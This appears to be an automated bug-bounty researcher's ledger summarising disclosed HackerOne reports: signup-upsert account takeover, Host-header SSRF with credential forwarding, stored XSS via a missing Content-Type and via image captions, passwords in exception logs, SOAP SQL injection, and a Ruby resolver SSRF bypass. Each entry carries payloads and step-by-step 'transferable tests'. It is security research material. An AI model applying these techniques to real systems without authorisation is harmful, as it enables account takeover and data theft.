  4. Log in with E + P2 — the attacker now holds the victim's account: Impact (verbatim): "An attacker can take over the control of any/all registered users."
DETECTION SIGNAL: a signup request with an ALREADY-REGISTERED email returning success instead of an exists-error; the tell that it is THIS bug (not the §17.551 auto-session mode-flip) is that NO session is minted for the victim account at signup — instead the LATER login with the attacker's new password succeeds on the EXISTING account (the password was overwritten).
CHAIN: knowledge of a victim email address (precondition: public info, zero interaction) -> plain re-registration of the existing email with an attacker-chosen password (primitive: registration accepts a duplicate identity) -> the create handler is an UPSERT on the email key so the write lands on the existing record (escalation) -> tokenless, verification-less password reset = ATO of every registered account (terminal; report's own impact verbatim: "take over the control of any/all registered users"). Per doctrine §8: precondition = a known email; gain = full credential takeover of that account with no victim interaction.
TRANSFERABLE TEST: with two accounts you control: register E+P1; then re-submit the create-account form (and the /api register endpoint directly) with E+P2, no code, no referral — the standard form; then attempt login E+P1 (fails = overwritten) and E+P2 (succeeds = the signup is a tokenless password-reset oracle). Diff the two signup requests for hidden mode flags. Rule: **an account-creation handler must INSERT on the identity key, not UPSERT — if re-registration succeeds and CHANGES the existing account's password, signup is a password-reset with no token and no interaction.**
DEDUPE/DELTA: tokens `767829`, `zude`, `starbuckscardb2b`, `re-registration`+password-overwrite, `password-reset oracle` = 0 technique hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: §17.551 (Shipt — a `short_code`/referral parameter flips the handler into new-account mode, suppresses the exists-check and AUTO-AUTHENTICATES the existing account — needs the mode-flip parameter and yields a session AT signup; here NO parameter, NO session at signup, the write is a password OVERWRITE); §17.497 (unverified email CHANGE re-binds sessions when the owner later registers — opposite direction); §17.539 (Gmail dot-alias collision couples two accounts through one reset token); §17.395 (invite-link bearer credential); §11.6 pre-hijacking (attacker REGISTERS the victim's address FIRST — opposite order); ledger ~4473 (signup uniqueness pollution = multi-account CREATION, not overwrite). NEW: the plain-signup UPSERT overwrite of the existing account's password. New general method -> §17.770.
FRESHNESS: created 2020-01-03, disclosed 2020-01-29 — OUTSIDE the preferred 6-12 month window (~6.8 years) — recorded as BACKFILL, flagged; read because assigned. The upsert-vs-insert shape is version-independent.
HONESTY: not reproduced (knowledge intake only). Every quote above is verbatim from the live `.json` `vulnerability_information` read IN FULL this pass.

SOURCE: https://hackerone.com/reports/310036  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/310036.json` — HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (FIRST route worked). Metadata: U.S. Dept Of Defense, "SSRF vulnerability on ██████████ leaks internal IP and various sensitive information", reporter `alyssa_herrera`, created 2018-01-28, disclosed 2019-12-02, severity medium.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no DoD host touched)
CLASS: SSRF / XSPA via HOST-HEADER userinfo (`@`) — `Host: <victim>:80@<attacker>` steers the request through the proxy chain to the ATTACKER's host while forwarding the client's cookies and the proxy's own Basic credentials, and leaks the internal egress IP
CORE METHOD:
  1. Baseline request to the target page with a normal `Host`.
  2. Rewrite ONLY the Host header: `Host: www.████:80@██████████.burpcollaborator.net` (report, verbatim: "if we use a @ on the host header like this ... It'll attempt to connect to our website and leak various information"). Repro, verbatim: "We can reproduce this simply using www.████:80@yourhostname.com for the host header and we'll the see the results."
  3. On the attacker listener observe the forwarded request (verbatim header block): `Host: ████████.burpcollaborator.net` + the CLIENT'S session cookies (`Cookie: mt=rid=6130; ASPSESSIONIDQABQSQCS=GNPLOPOCDIGPIKHGFMDDBLBG; googtrans=/en/zh-TW`) + `Authorization: Basic ***` (forwarded proxy/user credentials) + `X-BlueCoat-Via: 913daace1d652c00` + `X--------------: 1.1.1.1`.
  4. Attribute the egress (verbatim): "Additionally we will see a DNS look up from this IP, 214.72.0.2 Which I confirmed to be DOD owned" — the callback's source IP + ASN check (ipinfo) proves the request came FROM the target's infrastructure.
DETECTION SIGNAL: any request whose Host header accepts the `userinfo@host` authority shape (`victim:80@attacker`) and an OAST callback arrives FROM the target's IP carrying the ORIGINAL request's `Cookie`/`Authorization` — plus proxy-vendor headers (`X-...-Via`) on the callback revealing the internal proxy estate and egress IP.
CHAIN: attacker sends a request with `Host: victim:80@OAST` (primitive: host-header userinfo confusion at the forward proxy) -> the proxy chain connects to the attacker host = server-side request out of the internal network (SSRF/XSPA rung) -> the forwarded `Cookie` and `Authorization: Basic` = session/credential exfiltration of any client routed through the same proxy (escalation: full session theft) -> callback source IP + Via header leak the internal egress IP and proxy vendor (internal recon). Report's own impact (verbatim): "This will allow attackers to gain access to an internal IP of a DOD website along with other sensitive information that may be leaked with the request" — rated MEDIUM, recorded at its rated weight.
TRANSFERABLE TEST: on every request through the target's edge/proxy, send `Host: <target-host>:80@<OAST>` (variants: `:443@`, bare `@`, `Host: <target>@<OAST>`, and `Host: <target>:80@<OAST>` on SENSITIVE endpoints like login) and check (a) does an OAST callback arrive FROM the target's IP, (b) what travels with it (`Cookie`, `Authorization`, forwarded headers), (c) internal-IP attribution of the callback source (ipinfo ASN). Rule: **a Host header that accepts `userinfo@host` is parsed as an authority by the proxy chain — `Host: victim:80@attacker` turns the proxy into an SSRF pivot that forwards the client's cookies and its own credentials to you.**
DEDUPE/DELTA: tokens `310036`, `X-BlueCoat`, `:80@`+collaborator, `214.72.0.2` = 0 technique hits across the three write targets immediately before append (`alyssa_herrera` hits are a DIFFERENT report by the same reporter, #326043). Related-but-distinct REVIEWED and NOT conflated: the SSRF/XSPA class is owned (ledger 304/321/3357/4491/4688, §17.190); §17.123 / #398799 builds the OUTBOUND URL from the Host header via a Rails route helper (the APP fetches a Host-derived URL — different fetcher and mechanism); #326043 (batch 277, same reporter, §17.724) uses `*militarywebsite.mil@internal_IP*` as an SSRF FILTER-BYPASS to reach an internal IP (inbound to internal) — this entry's `@` is in the Host header steering the proxy OUTBOUND to the attacker host with credential forwarding (opposite direction, different impact); `Host: target.com@attacker.com` appears ONLY as a variant in the §11.4/V-06 password-reset-poisoning test templates (email-link construction, different impact); the recorded userinfo-`@` SSRF tricks are URL-PARAMETER SSRF (URI-parser delta entry). Per the batch-165/#1551176/#1851818/#1066189 precedent (mechanism-variant of an owned class -> ledger entry, NO §17 slot): entry only.
FRESHNESS: created 2018-01-28, disclosed 2019-12-02 — OUTSIDE the preferred window (~8.8 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (knowledge intake only). Every quote above is verbatim from the live `.json` body read IN FULL this pass; the redacted host `████` is as-disclosed and NOT sought out.

SOURCE: https://hackerone.com/reports/168458  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/168458.json` — HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (FIRST route worked). Metadata: Shopify, "Stored XSS in https://productreviews.shopifyapps.com/proxy/v4/reviews/product", reporter `zombiehelp54`, created 2016-09-14, disclosed 2019-11-08, severity (not rated in the body).
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no shop or product created)
CLASS: stored XSS via CONDITIONAL Content-Type — the JSONP `callback` parameter is the ONLY thing that sets `Content-Type: application/javascript`; dropping it leaves the response with NO Content-Type header, the browser sniffs it as text/html, and the attacker's stored product title executes on the shared multi-tenant origin
CORE METHOD:
  1. Attacker (any partner/merchant account) creates a product whose TITLE contains the XSS payload on their own shop (report: "I have created a product with an XSS payload in the title and added the id in the url." — shop `zh5403-attacker.myshopify.com`).
  2. Point the shared reviews API at the attacker's tenant: `GET /proxy/v4/reviews/product?product_id=8254331011&version=v4&shop=zh5403-attacker.myshopify.com&_=cache&callback=test` — with `callback`, verbatim: "Having the `callback` parameter in the url will return `Content-Type:application/javascript` in the response headers".
  3. Drop the `callback` parameter — verbatim: "however, if the url does not contain that parameter, the response won't contain **Content-Type** header in the response so the browser will display the page as **text/html**" — the JSON body containing the attacker's stored title is now rendered as HTML.
  4. Victim opens the crafted URL on the shared origin `productreviews.shopifyapps.com` (the report also confirms the CDN twin `productreviews.shopifycdn.com` — "I found that it also works for") — the stored payload executes in the shared app origin.
DETECTION SIGNAL: a JSON/JSONP data endpoint whose Content-Type is set ONLY when `callback`/`format`-style param is present (`curl -sI` diff with and without it); a no-param response with NO Content-Type (or text/html) whose BODY contains an attacker-controlled stored value; a multi-tenant selector (`shop=`, `account=`, `store=`) on a SHARED origin letting any tenant's object be fetched on the shared domain.
CHAIN: attacker stores a payload in an object they own (primitive: stored attacker data) -> the shared multi-tenant endpoint serves ANY tenant's object via the `shop=` selector on the shared origin (primitive: cross-tenant data on shared domain) -> omitting `callback` drops the Content-Type (bypass: the header is conditional on the JSONP param) -> the browser sniffs text/html -> stored XSS on productreviews.shopifyapps.com (terminal: arbitrary JS in the shared reviews origin — session/cookie access for any victim opening the link; report's own impact: stored XSS on the shared domain).
TRANSFERABLE TEST: on every JSON/JSONP data endpoint: `curl -sI '<url>'` with and WITHOUT `callback`/`format`/`_` and diff the Content-Type; if the no-param response has NO Content-Type (or text/html) AND the body carries an attacker-controlled stored value (title/name/description of an object you own), open it in a browser — payload executes = stored XSS. Test the primary AND the CDN twin domain. Rule: **a `callback` parameter must never be the only thing setting the Content-Type — a header-less JSON response containing attacker-stored data on a shared multi-tenant origin is stored XSS.**
DEDUPE/DELTA: tokens `168458`, `productreviews`, `callback`+`application/javascript` = 0 technique hits across the three write targets immediately before append (`zombiehelp54` hits are OTHER Shopify reports by the same reporter — #229619 email verification, #416983 Shopify Flow). Related-but-distinct REVIEWED and NOT conflated: §1.4 owns the served-content-type-sniffing CLASS ("the bug is almost always served-content-type sniffing ... without `X-Content-Type-Options: nosniff`") for UPLOADED files; the "string-searching a directive inside the Content-Type header value" entry is header-VALUE confusion surviving `nosniff` (different mechanism; that entry explicitly declines a §17 slot because the class is owned — same precedent applied here); the JSONP corpus entries are callback SINKS (`setTimeout` CSP bypass, Rosetta Flash content-type match) — not content-type GATING; the `shop=` cross-tenant read is the multi-tenant carrier. Per the carrier-delta precedent: entry only, NO §17 slot.
FRESHNESS: created 2016-09-14, disclosed 2019-11-08 — OUTSIDE the preferred window (~10 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (knowledge intake only). Every quote above is verbatim from the live `.json` body read IN FULL this pass.

SOURCE: https://hackerone.com/reports/469668  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/469668.json` — HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (FIRST route worked). Metadata: Nextcloud, "Passwords being stored as plain text in logging", reporter `xatom`, created 2018-12-18, disclosed 2019-08-31, severity low.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no Nextcloud instance stood up)
CLASS: sensitive info disclosure (CHAIN-FIRST-LINK) — the exception/stack-trace serializer logs the THROWING CALL'S ARGUMENTS, including plaintext passwords; the framework's sensitive-data filter is a deny-list of METHOD NAMES and misses most password-accepting methods
CORE METHOD:
  1. Find a flow that passes a password as a method ARGUMENT and can be made to THROW (report, verbatim: "When an exception occurs, any password sent to or being processed by the server may be stored as plain text in the log.").
  2. Force the throw by breaking the downstream dependency — the repro (verbatim): "Install NextCloud without SMTP server" / "Create a new user at `https://nextcloud/settings/users`" — the invitation-mail send fails and the exception log records the call with its arguments: `addUser("[redacted]", "[redacted - PASSWORD]", "[redacted]", "[redacted]", [], [], "10 GB", "en")` (the second argument is the password).
  3. Read the exception log at `https://nextcloud/settings/admin/logging` — the report shows TWO exceptions (`OCSException` on `addUser` and `Swift_TransportException` from the mailer) that both carry the password in the stack-trace argument list.
  4. Root cause (report, verbatim): "I noticed that some methods are already being filtered in `ExceptionSerializer.php`, but many methods are missing from this list." Fix (verbatim): "Suggestion: instead of relying on a list of sensitive methods, filter every method with a `$password` parameter."
DETECTION SIGNAL: any app with verbose exception logging or a third-party error tracker (Sentry etc.); a stack-trace entry rendering call ARGUMENTS (`addUser("x", "<password>", ...)`); the tell: a deny-list of "sensitive methods" instead of a filter on parameter names; forcing an error on a password/token-accepting endpoint shows the submitted secret inside the log entry.
CHAIN: attacker triggers an exception on a password-accepting flow (primitive: force-the-throw on the secret path) -> the exception serializer writes the plaintext password into the application log (primitive: second sink for secrets) -> anyone who can read logs — delegated/support roles with log-view access, third-party error-tracker/monitoring integrations the logs are shipped to, or any LFI/file-read/backup-exposure primitive — harvests usernames, e-mail addresses and passwords (escalation) -> login as the provisioned accounts = ATO. Report's own impact (verbatim): "Get various user names, e-mail addresses and passwords from log files"; H1 rated LOW — recorded at its rated weight; the ATO rung is flagged as the consequence of log READ access (the standard log-exposure chain), not demonstrated in the report. Per doctrine: recorded only as the first link of that chain.
TRANSFERABLE TEST: on any app with exception logging/error tracking: (1) enumerate endpoints that accept a password/token as a method argument (signup, invite, password-change, SMTP/API-key connectivity test); (2) force a throw by breaking the downstream dependency (invalid SMTP host, revoked API key, unreachable relay) or input that reaches the throwing branch; (3) read the log/error-tracker event and grep the stack-trace ARGUMENTS for the secret you submitted; (4) repeat for token/secret-bearing params. Rule: **an exception serializer is a second sink for secrets — filter by PARAMETER NAME (`$password`, `token`, `secret`) on every method, not by a deny-list of method names; the test is to force a throw on the secret path and read what the stack trace serialized.**
DEDUPE/DELTA: tokens `469668`, `xatom`, `ExceptionSerializer`, `addUser(`+password-arg = 0 technique hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: the "masking-gap disclosure" entry (a secret masked on the object page but plaintext in the audit/action log — "the log is a second serializer with its own escaping/masking rules"; its test diffs the NORMAL-OPERATION rendering of a value set through a CLI) — here NOTHING is logged in normal operation; only the EXCEPTION path serializes the secret, so the test is force-the-throw; the "mine the log for credentials" entry (stored-procedure args inside EXPOSED log files) is the READING side of log exposure; doctrine §2(b) "descriptive error messages / stack traces" is ineligible standalone — this entry is chain-framed (the stack trace carries a live SECRET, not a description). New general method -> §17.771 (force-the-throw + parameter-name filter rule).
FRESHNESS: created 2018-12-18, disclosed 2019-08-31 — OUTSIDE the preferred window (~7 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (knowledge intake only). Every quote above is verbatim from the live `.json` body read IN FULL this pass.

SOURCE: https://hackerone.com/reports/495583  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/495583.json` — HTTP 200, `visibility: full`; the `vulnerability_information` is ONLY the FortiGuard notification letter (2,205 B) — the concrete method is in the report's own ATTACHMENTS, fetched this pass from the S3 `expiring_url`s listed in the same `.json` (`FG-VD-19-022.txt` 2,173 B = the letter; `PoC.txt` 782 B = the three-step PoC), PLUS the credited public writeup (FortiGuard Labs blog by Zhouyuan Yang, "WordPress WooCommerce XSS Vulnerability – Hijacking a Customer Account with a Crafted Image", 2019-03-04, via web_extract). Metadata: Automattic (`automattic`), "[FG-VD-19-022] Wordpress WooCommerce Cross-Site Scripting Vulnerability Notification", H1 reporter `yzy9951` (submitter; the finder is FortiGuard's Zhouyuan Yang), created 2019-02-14, disclosed 2019-04-06, H1 severity medium (CVSS 6.0 AV:N/AC:H/PR:H/UI:R), weakness Cross-site Scripting (XSS) - Stored; affected WordPress 5.0.3 / WooCommerce 3.5.4 (fixed in 3.5.5), CVE-2019-9168.
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no WordPress/WooCommerce instance stood up)
CLASS: stored XSS via IMAGE-METADATA CARRIER in a SECONDARY RENDER PATH — the media-library image Caption (and, in the delivery variant, the image's EXIF Title/Subject) is sanitized on the primary product page but emitted raw in the Photoswipe product-image ZOOM view
CORE METHOD:
  1. With an account holding ONLY image-upload permission (blog, verbatim: "In WordPress, uploading an image into a low permission account doesn't require permission to access the WooCommerce plug-in"), upload a media-library image and put the payload in its Caption (PoC.txt, verbatim): "An attacker with upload image permission, can upload an image and add the following code in the Caption \"<img src=1 onerror=prompt('1')>\" (note: remove the start and ending double quotes.)".
  2. A user with product rights attaches that image as the Product image / gallery (PoC.txt, verbatim: "An attacker or victim with post new product permission could add this image to the Product image.") — the attacker can hold those rights, OR a SITE MANAGER is induced to adopt a crafted image (delivery variant, blog, verbatim: "an attacker could modify an image's Title and Subject locally by changing them to \"<img src=1 onerror=prompt('2')>\"" ... "The attacker can then share this image to the site manager. Then, when the manager uses this image as the Product image or in the Product gallery, the XSS code will be inserted.").
  3. The payload is inert on the product page and fires only in the ZOOM view (PoC.txt, verbatim: "When any user views this product and zoom the product image, the XSS code will be executed.") — the root cause (blog, verbatim): "This XSS vulnerability (CVE-2019-9168) exists in the zoom display of the Photoswipe function, where WooCommerce failed to sterilize an image's title and caption data".
  4. Impact (blog, verbatim): "An attacker could exploit this vulnerability to hijack the current user session" and "gather sensitive information" — any visitor who zooms the product image, i.e. ordinary customers.
DETECTION SIGNAL: a media pipeline where an object's metadata (Caption, title, EXIF/IPTC Title/Subject/Comment) is escaped on the primary render but echoed raw in a SECONDARY view (zoom/lightbox/gallery strip/export/print/PDF/AMP/share-preview); a role that can upload media but cannot publish products; a workflow where a higher-priv user "adopts" attacker-supplied media. Tell: the marker/payload is inert on the page and live only on zoom.
CHAIN: low-priv media upload (primitive: upload permission is separate from product permission) -> payload stored in image Caption / EXIF Title-Subject (primitive: metadata carrier — invisible to page-level sanitization) -> a product-permission user (attacker or induced manager) attaches the image (second-person trigger; the crafted-EXIF variant delivers through the trusted media workflow) -> the Photoswipe ZOOM template renders the metadata unsanitized (bypass: the sanitizer lives on the primary render path only) -> stored XSS in the product page's zoom view -> session hijack of any viewing customer (blog, verbatim: "hijack the current user session"). H1 rated MEDIUM (AC:H/PR:H/UI:R), FortiGuard risk level 2/5 — recorded at its rated weight; per doctrine the session-hijack rung classifies as stored XSS with session impact where the prize is the shopper's session.
TRANSFERABLE TEST: on every upload+gallery pipeline: (1) as a LOW-priv user, upload an image with a unique marker in EVERY metadata field (media Caption, EXIF Title/Subject/Comment, filename); (2) get the image attached to a public object, then open EVERY render path of it — page, zoom/lightbox, gallery strip, export/print/PDF, AMP, share preview — and diff which path echoes the marker raw; (3) re-test the echoing path with `<img src=1 onerror=prompt(1)>`; (4) run the social-delivery rung too: mail a crafted-EXIF image to a manager and ask them to attach it. Rule: **the sanitizer must live on EVERY render path of a metadata field — a payload inert on the page but live in the zoom view is stored XSS, and low-priv upload + higher-priv "attach" makes it a cross-privilege attack.**
DEDUPE/DELTA: tokens `495583`, `yzy9951`, `FG-VD-19-022`, `CVE-2019-9168`, `photoswipe` = 0 technique hits across the three write targets immediately before append (the `photoswipe` hits under /root/recon/swisslos are hunt-cache JS, not ledger material). Related-but-distinct REVIEWED and NOT conflated: the "secondary render path" CLASS is OWNED — §17.27 (name -> secondary render path -> stored XSS), ledger 2568 ("Each render path must be tested separately"), 3600 (subordinate render paths where "the owning feature's sanitizer runs on one path but not the other"), 8649 ("the SAME field rendered by MORE THAN ONE view ... since the sanitizer usually lives in only one of them"), and the ledger-5416 precedent (class recorded -> carrier-delta entry only, NO §17 slot) applied here; the Shopify avatar EXIF XSS (ledger ~12014, HTML in a `tEXt` chunk served from a CDN) is the CONTENT-TYPE/CDN family — here the sink is an application TEMPLATE (zoom view) on the shop origin; §17.760 (WordPress attachment-metadata `sub_sizes[].file` filename -> wp-admin attribute breakout) poisons a FILENAME on the admin origin, not a caption on the shop-front zoom; the `exiftool -documentname` webshell entry (ledger ~17389) is EXIF-carried PHP (RCE), not EXIF-carried HTML. Per the carrier-delta precedent: entry only, NO §17 slot.

SOURCE: https://hackerone.com/reports/390359  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/390359.json` — HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (1,071 B; FIRST route worked; the target host and the PoC screenshot URLs are redacted `███` as-disclosed and were NOT sought out). Metadata: U.S. Dept Of Defense (`deptofdefense`), "SOAP WSDL Parser SQL Code Execution", reporter `websecnl`, created 2018-08-03, disclosed 2019-01-16, severity critical, weakness SQL Injection. The report names the third-party product behind the panel: CIMScan (reached via a staff link).
STATUS: UNVERIFIED (not reproduced — knowledge intake only; no DoD host touched)
CLASS: SQLi via WSDL-GUIDED SOAP TAMPER-REPLAY — the exposed WSDL of a SOAP admin panel enumerates every operation and parameter; a legitimate SQL-carrying SOAP call is then REPLAYED with its parameter replaced by a custom SQL command
CORE METHOD:
  1. Reach the SOAP admin panel from a staff/intranet link (report, verbatim: "Visit:███ and go to the staff links 'CIMScan'").
  2. Parse its WSDL and read out the full function inventory (report, verbatim: "It was possible to parse WSDL resources and read all functions from the SOAP Admin Panel") — the WSDL yields operation names, parameter order and types.
  3. Rebuild one legitimate request of a data-returning operation and REPLAY it with the parameter swapped for custom SQL (report, verbatim: "therefor i was able to repeat the sql query with a tampered request with my own custom SQL command").
  4. Demonstrated impact (report, verbatim): "i was able to extract all the database names for PoC" — SQL data extraction through the tampered envelope. The report's further claims — "there is no doubt in my mind that i could login to the admin panel and compromise the entire DoD Information System" and impact "Remote Code Execution" — are UNPROVEN assertions; demonstrated = DB-name extraction (recorded at its demonstrated weight).
DETECTION SIGNAL: any `?wsdl`/`?WSDL`, `.asmx`, `.svc`, `.soap`, `.ws` endpoint reachable from a privileged or semi-privileged context (staff portal, intranet link, partner console) that returns `<definitions>` XML; the operation list contains data-returning methods with free-form string parameters (filter/search/name/where-shaped); a tampered SOAP envelope whose SQL metacharacters produce DB errors, time delays or extra result rows vs the benign replay.
CHAIN: staff/intranet link to a third-party SOAP admin panel (primitive: internal admin surface inside the target's estate) -> fetch the WSDL -> complete operation + parameter map ("read all functions" — the interface description is the attack map) -> replay a legitimate call with custom SQL in a string parameter (bypass: the WSDL supplies the exact envelope shape, no black-box guessing) -> SQLi -> database enumeration demonstrated (verbatim: "extract all the database names for PoC"). UNPROVEN rungs flagged per doctrine §8.5: the report's claim of admin login and full system compromise (verbatim: "i could login to the admin panel and compromise the entire DoD Information System", impact "Remote Code Execution") — no evidence shown; demonstrated terminal = SQLi data extraction (P2/High class per §6).
TRANSFERABLE TEST: on every SOAP/XML surface found (staff links, `?wsdl` in content discovery, `.asmx`/`.svc`/`.ws`): (1) GET the WSDL and list every operation + parameter; (2) replay one call per data-returning operation with a benign value to establish the baseline envelope; (3) tamper ONE string parameter at a time with SQL probes (`'`, `"`, `1' OR '1'='1`, time-based `'; WAITFOR DELAY '0:0:5'--`, error-based) and diff status/body/timing vs baseline; (4) on any oracle, move to UNION/error-based extraction of schema names. Rule: **a WSDL is an injection harness, not just disclosure — it publishes the exact operation and parameter schema, so the test is to replay every operation with tampered parameters, one at a time.**
DEDUPE/DELTA: tokens `390359`, `websecnl`, `CIMScan` = 0 technique hits across the three write targets immediately before append. Related-but-distinct REVIEWED and NOT conflated: §17.753 (SharePoint `?WSDL` = unauthenticated map of the admin API — WSDL proves EXPOSURE, `GetListItems` proves DATA; class = BAC on anonymous access — here the surface is a privileged panel and the class is INJECTION through tamper-replay of WSDL-built envelopes); §17.731 (SOAP-under-REST protocol confusion -> XXE) and the `*SOAP`-named-parameter XXE entries (XML parser activation, not SQLi); the ymon/Nagios entry (WSDL -> plugin-allowlisted `exec()` RPC reached through a URL fetcher) is SSRF->RPC; §17.656 (SharePoint deserialization) uses a SOAP call as a serialized-state WRITE leg. The general method "WSDL/interface description as an injection-crafting harness -> replay each operation and tamper its parameters" is NEW -> §17.772.

SOURCE: https://hackerone.com/reports/287245  2026-11-13
ROUTE: live `curl https://hackerone.com/reports/287245.json` — HTTP 200, `visibility: full`, `vulnerability_information` 2,525 B read IN FULL (FIRST route worked). Metadata: HackerOne (`security`), "Blind SSRF in "Integrations" by abusing a bug in Ruby's native resolver.", reporter `edoverflow`, created 2017-11-03, disclosed 2017-11-09, severity None (unrated), weakness Server-Side Request Forgery (SSRF), CVE-2017-0904.
STATUS: VERIFIED (core mechanism reproduced in a local lab this pass — Ruby 3.2.3 (2024-01-18 build) on this host: `Resolv.getaddresses("127.000.001"/"0177.1"/"0x7f.1"/"127.000.000.1") => []` while `Socket.getaddrinfo` resolves each of the four to `127.0.0.1`; the fail-open `ips.any?` consequence follows directly from the quoted guard code. The full SSRF through HackerOne's Integrations panel was NOT re-run.)
CLASS: SSRF filter bypass — a guard that RESOLVES the user-supplied host and denies on a matched IP FAILS OPEN when its own resolver returns an EMPTY result; the literal forms the guard's resolver cannot parse are parsed fine by the fetcher's resolver (guard-resolver vs fetcher-resolver differential)
CORE METHOD:
  1. The guard resolves the supplied host ITSELF and denies on match — report quotes `private_address_check` verbatim: `def resolves_to_private_address?(hostname) ips = Resolv.getaddresses(hostname); ips.any? do |ip| private_address?(ip) end end` (surface: HackerOne's Integrations panel `https://hackerone.com/{BBP}/integrations`, Jira/Phabricator report linking).
  2. Feed IP-literal forms the guard's pure-Ruby `Resolv` fails to PARSE — report verbatim: "The bypass consists of providing encoded IP addresses that when forwarded on to the operating system in `lib/resolv.rb` return an empty value." Payloads verbatim: `http://0177.1:22/`, `http://0x7f.1:22/`, `http://127.000.001:22/`.
  3. `Resolv.getaddresses` returns `[]` and `ips.any?` over an empty set is false — verbatim: "allows me to return an empty value, which is not included in the blacklist and therefore completely bypasses any checks" — while the HTTP client's resolver (libc) reads the same literal as 127.0.0.1 and connects = blind SSRF past the guard.
  4. The variance IS the probe — verbatim: Machine 1 `Resolv.getaddresses("127.000.000.1") => []`, Machine 2 `=> ["127.0.0.1"]`; "I discovered the bug in `Resolv::getaddresses` by running it on different Linux machines and noticing that the outputs vary."
  5. Fix (report): use `Socket.getaddrinfo()` — "as it is more reliable and is not affected by this bug" — i.e. ONE resolver shared by check and fetch (lab-confirmed: `getaddrinfo` resolves all four forms; the guard must also fail CLOSED on empty).
DETECTION SIGNAL: an SSRF/allow-list guard that performs its OWN resolution and passes when the resolved set is EMPTY (`ips.any?`-shaped helpers, `resolves_to_private_address?`, any "resolve then compare against private ranges" check); inputs whose parse FAILS in the guard's resolver but succeeds in the fetcher's (compact two-segment `0177.1`/`0x7f.1`, zero-padded `127.000.001`/`127.000.000.1`); the same input resolving differently across runtimes/hosts is the tell (lab: still true on Ruby 3.2.3, 2024 — the mechanism is not stale).
CHAIN: guarded URL-fetch feature (primitive: SSRF sink behind a resolver-based private-address check) -> a literal the guard's resolver cannot parse returns EMPTY -> `any?`-on-empty = fail-open (bypass) -> the fetcher's resolver connects to 127.0.0.1/internal via the same literal -> blind SSRF -> internal port/service scanning from response behaviour (report verbatim: "could potentially scan your internal network" — UNPROVEN; report verbatim: "Admittedly, I was unable to actually exploit this issue ... The current issue only consists of a filter bypass"). Recorded as chain-first-link per doctrine §2; terminal rung flagged unproven (H1 severity None).
TRANSFERABLE TEST: on every SSRF guard that RESOLVES before deciding: (1) replay the internal target in forms its parser may reject — `0177.1`, `0x7f.1`, `127.000.001`, `0177.0.0.1`, `0x7f000001`, `2130706433` — and diff the GUARD verdict against whether the request LANDS (collaborator/latency/status oracle); (2) any input where the guard errors or resolves to NOTHING while the fetch still connects is the fail-open; (3) run the guard's resolver alone in its own runtime (`ruby -rresolv -e 'p Resolv.getaddresses("127.000.001")'` vs `Socket.getaddrinfo(...)`) — an EMPTY guard result where the fetcher resolves is the bypass, and results differing across machines reproduce the report's own discovery method. Rule: **a check that resolves user input must FAIL CLOSED on empty/error resolution and must resolve with the SAME resolver as the fetcher — probe the guard resolver's PARSE-FAILURE set, not only the string blocklist.**
DEDUPE/DELTA: tokens `287245`, `private_address_check`, `Resolv.getaddresses`, `0177.1`, `0x7f.1`, `127.000.001`, `getaddrinfo` = 0 technique hits across the three write targets immediately before append (the `getaddresses` hits are the inDriver `/api/getaddresses` endpoint — a different thing; the `getaddrinfo` hits are the libuv 256-byte-truncation entry). Related-but-distinct REVIEWED and NOT conflated: the recorded alternate-IP-notation family (ledger 2081/4079/7787-7793 + table 12360, §17.250, §17.255) dodges a STRING denylist via re-encoding; here there is NO string check — the guard RESOLVES and compares IPs, and the bypass is a parse-failure EMPTY set that `ips.any?` treats as pass (the recorded notation-replay test would FIND this bug, but the fail-open root cause, the runtime-variance signal and the shared-resolver fix rule are not recorded). The "validation and resolution are separate steps" generalization (ledger 4118/21529 — libuv 256-byte truncation, UriComponentsBuilder userinfo) covers validator-vs-fetcher disagreement but not fail-open-on-EMPTY nor the pure-Ruby-`Resolv`-vs-libc `getaddrinfo` implementation differential. The fail-open family (V-07 `code=null`, §17.212 expiry branch, §17.630 permission-key typo) fails open at token/permission layers, not DNS resolution. NEW general method -> §17.773.
FRESHNESS: created 2017-11-03, disclosed 2017-11-09 — OUTSIDE the preferred 6-12 month window (~9 years) — recorded as BACKFILL, flagged; read because assigned. Mitigating fact: the differential was re-confirmed live on Ruby 3.2.3 (2024-01-18 build) this pass, so the mechanism itself is current.
HONESTY: reproduced locally (see STATUS); every quote above is verbatim from the live `.json` body read IN FULL this pass. Knowledge intake only — the local lab calls were four `ruby -rresolv/-rsocket` one-liners; no target was touched.
